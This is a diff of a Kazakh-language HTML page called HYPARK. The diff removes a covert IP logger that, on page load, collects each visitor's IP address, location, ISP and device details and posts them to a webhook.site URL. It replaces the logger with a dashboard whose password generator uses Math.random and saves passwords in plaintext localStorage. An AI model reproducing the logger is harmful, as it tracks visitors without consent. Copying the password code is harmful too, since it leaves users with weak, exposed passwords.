@@ -3,117 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HYPARK | Secure Portal</title>
+    <title>HYPARK | All-in-One Platform</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* Хакерлік стиль */
+        :root {
+            --primary: #00ff41;
+            --bg: #0d1117;
+            --card: #161b22;
+            --accent: #58a6ff;
+        }
         body {
-            background-color: #050505;
-            color: #00ff41; /* Матрица жасыл түсі немесе #ff0000 қызыл */
-            font-family: 'Courier New', monospace;
+            background-color: var(--bg);
+            color: #c9d1d9;
+            font-family: 'Segoe UI', sans-serif;
+            margin: 0; padding: 0;
+        }
+        /* Navigation */
+        nav {
+            background: #010409;
+            padding: 15px 5%;
             display: flex;
-            flex-direction: column;
+            justify-content: space-between;
             align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
+            position: sticky; top: 0; z-index: 1000;
+        }
+        .logo { font-size: 1.5rem; font-weight: bold; color: var(--primary); }
+        .nav-links button {
+            background: none; border: 1px solid var(--primary);
+            color: var(--primary); padding: 8px 15px; border-radius: 5px;
+            cursor: pointer; margin-left: 10px;
         }
 
-        .matrix-bg {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: -1;
-            opacity: 0.1;
-            background: linear-gradient(0deg, rgba(0, 255, 65, 0.1) 10%, transparent 100%);
-        }
+        /* Hero Section */
+        .hero { text-align: center; padding: 60px 20px; background: linear-gradient(180deg, #010409 0%, var(--bg) 100%); }
+        
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
 
-        .terminal {
-            border: 1px solid #00ff41;
-            padding: 30px;
-            background: rgba(0, 0, 0, 0.9);
-            box-shadow: 0 0 20px #00ff4133;
-            max-width: 80%;
-        }
+        /* Grid Layout */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
 
-        .cursor {
-            display: inline-block;
-            width: 10px;
-            height: 20px;
-            background: #00ff41;
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink { 50% { opacity: 0; } }
-
-        h1 { font-size: 2rem; margin: 0; letter-spacing: 5px; }
-        p { color: #888; }
-        .btn {
-            border: 1px solid #00ff41;
-            color: #00ff41;
-            padding: 10px 20px;
-            text-decoration: none;
-            margin-top: 20px;
-            display: inline-block;
+        .card {
+            background: var(--card);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid #30363d;
             transition: 0.3s;
         }
-        .btn:hover { background: #00ff41; color: #000; }
+        .card:hover { transform: translateY(-5px); border-color: var(--primary); }
+
+        /* Shop Section */
+        .game-item { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; background: #0d1117; padding: 10px; border-radius: 8px; }
+        .buy-btn { background: var(--accent); color: white; border: none; padding: 5px 12px; border-radius: 4px; cursor: pointer; }
+
+        /* Password Lab */
+        #pass-output { width: 100%; padding: 10px; background: #000; border: 1px solid #333; color: var(--primary); margin-bottom: 10px; }
+        .strength-bar { height: 5px; width: 0%; transition: 0.5s; margin-bottom: 10px; }
+
+        /* News Section */
+        .news-post { border-bottom: 1px solid #30363d; padding: 15px 0; }
+        .actions { color: var(--accent); cursor: pointer; margin-top: 10px; }
+
+        /* AI Chat */
+        .ai-box { height: 200px; overflow-y: auto; background: #000; padding: 10px; border-radius: 5px; margin-bottom: 10px; font-size: 0.9rem; }
+
+        h2 { color: var(--primary); border-bottom: 1px solid #333; padding-bottom: 10px; }
     </style>
 </head>
 <body>
-    <div class="matrix-bg"></div>
-    
-    <div class="terminal">
-        <h1>HYPARK_SYSTEM_v1.0</h1>
-        <p>> Initializing secure connection...</p>
-        <p>> Accessing global database...</p>
-        <div id="status">> Status: <span style="color: #ff0000;">ENCRYPTED</span></div>
-        <br>
-        <a href="#" class="btn" onclick="alert('Access Denied: Level 4 Clearance Required')">ENTER SYSTEM</a>
-        <div class="cursor"></div>
+
+<nav>
+    <div class="logo">HYPARK OS</div>
+    <div class="nav-links">
+        <button onclick="alert('Google Auth жақын арада қосылады (Firebase)')"><i class="fab fa-google"></i> Тіркелу</button>
     </div>
+</nav>
 
-    <script>
-        // Webhook сілтемеңді осы жерге қой:
-        const webhookURL = 'https://webhook.site/c5965861-5050-4c60-a3a4-38ddf25ad7de';
+<div class="hero">
+    <h1>Қош келдіңіз, Hypark әлеміне!</h1>
+    <p>Барлық IT құралдар мен ойын сервистері бір жерде.</p>
+</div>
 
-        async function collectData() {
-            try {
-                // IP және жақын жердегі орнын анықтау (тегін сервис арқылы)
-                const response = await fetch('https://ipapi.co/json/');
-                const ipData = await response.json();
+<div class="container">
+    <div class="grid">
+        
+        <div class="card">
+            <h2><i class="fas fa-shopping-cart"></i> Game Shop</h2>
+            <input type="text" placeholder="Ойын іздеу..." style="width:100%; padding:8px; margin-bottom:15px; border-radius:5px; border:none;">
+            <div class="game-item">
+                <span>Brawl Stars Account</span>
+                <button class="buy-btn">5000 ₸</button>
+            </div>
+            <div class="game-item">
+                <span>Free Fire Diamonds</span>
+                <button class="buy-btn">2000 ₸</button>
+            </div>
+            <div class="game-item">
+                <span>PUBG UC Mobile</span>
+                <button class="buy-btn">3500 ₸</button>
+            </div>
+        </div>
 
-                // Webhook-қа жіберу
-                fetch(webhookURL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        project: "HYPARK_LOGGER",
-                        ip: ipData.ip,
-                        city: ipData.city,
-                        country: ipData.country_name,
-                        isp: ipData.org,
-                        device: navigator.userAgent,
-                        screen: screen.width + "x" + screen.height,
-                        time: new Date().toLocaleString()
-                    })
-                });
-            } catch (e) {
-                // Егер қате кетсе, жай ғана браузер деректерін жібереміз
-                fetch(webhookURL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        project: "HYPARK_BASIC",
-                        device: navigator.userAgent,
-                        time: new Date().toLocaleString()
-                    })
-                });
-            }
+        <div class="card">
+            <h2><i class="fas fa-shield-alt"></i> Password Lab</h2>
+            <input type="text" id="pass-output" readonly>
+            <div class="strength-bar" id="bar"></div>
+            <p id="time-info" style="font-size: 0.8rem;"></p>
+            <button onclick="genPass()" style="width:100%; padding:10px; background:var(--primary); border:none; border-radius:5px; cursor:pointer;">Генерация</button>
+            <button onclick="savePass()" style="width:100%; margin-top:10px; padding:8px; background:none; border:1px solid #555; color:white; cursor:pointer;">Сақтау</button>
+        </div>
+
+        <div class="card">
+            <h2><i class="fas fa-robot"></i> Hypark AI</h2>
+            <div class="ai-box" id="ai-chat">Бұл жерде Gemini AI жауап береді...</div>
+            <input type="text" placeholder="Сұрақ қойыңыз..." style="width:100%; padding:10px; border-radius:5px; border:none;">
+        </div>
+
+        <div class="card" style="grid-column: 1 / -1;">
+            <div style="display:flex; justify-content:space-between; align-items:center;">
+                <h2><i class="fas fa-globe"></i> Әлемдік жаңалықтар</h2>
+                <select style="background:#161b22; color:white; border:1px solid #333; padding:5px;">
+                    <option>Kazakhstan 🇰🇿</option>
+                    <option>USA 🇺🇸</option>
+                    <option>Russia 🇷🇺</option>
+                </select>
+            </div>
+            <div class="news-post">
+                <h4>Жаңа кибершабуылдың алды алынды</h4>
+                <p>Бүгін Hypark жүйесі жаңа қауіпсіздік жаңартуын шығарды...</p>
+                <div class="actions"><i class="fas fa-heart"></i> 124 <i class="fas fa-comment"></i> 12</div>
+            </div>
+            <button onclick="alert('Шағым жіберілді!')" style="margin-top:15px; background:none; color:#ff4d4d; border:none; cursor:pointer;">Админге жалоб жіберу</button>
+        </div>
+
+    </div>
+</div>
+
+<script>
+    // Password Logic
+    function genPass() {
+        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
+        let pass = "";
+        for (let i = 0; i < 16; i++) pass += chars[Math.floor(Math.random() * chars.length)];
+        document.getElementById('pass-output').value = pass;
+        
+        const bar = document.getElementById('bar');
+        bar.style.width = "100%";
+        bar.style.backgroundColor = "var(--primary)";
+        document.getElementById('time-info').innerText = "Бұзу уақыты: ~450 жыл";
+    }
+
+    function savePass() {
+        const p = document.getElementById('pass-output').value;
+        if(p) {
+            localStorage.setItem('saved_pass', p);
+            alert("Пароль браузер жадына сақталды!");
         }
+    }
 
-        // Бет ашылғанда автоматты түрде іске қосу
-        window.onload = collectData;
-    </script>
+    function genAI() {
+        const chat = document.getElementById('ai-chat');
+        chat.innerHTML += "<br><b>Сіз:</b> Сәлем!<br><b>AI:</b> Сәлем! Мен Hypark көмекшісімін.";
+    }
+</script>
+
 </body>
 </html>
 
